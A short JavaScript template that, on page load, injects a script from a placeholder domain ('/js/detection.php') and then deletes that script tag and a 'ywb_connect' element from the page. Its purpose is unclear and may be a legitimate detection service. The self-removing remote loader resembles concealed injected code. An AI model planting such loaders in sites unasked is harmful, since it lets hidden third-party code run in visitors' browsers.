var domain = '{DOMAIN}';
var tp = 'text/javascript';

document.addEventListener('DOMContentLoaded', function () {
    var scr = 'detection';
    var s = document.createElement('script');
    s.type = tp;
    s.src = 'https://'+domain + '/js/' + scr + '.php';
    s.id = 'ywb_' + scr;
    document.querySelector('body').appendChild(s);
    document.getElementById(s.id).remove();
    var connScript = document.getElementById('ywb_connect');
    if (connScript) connScript.remove();
});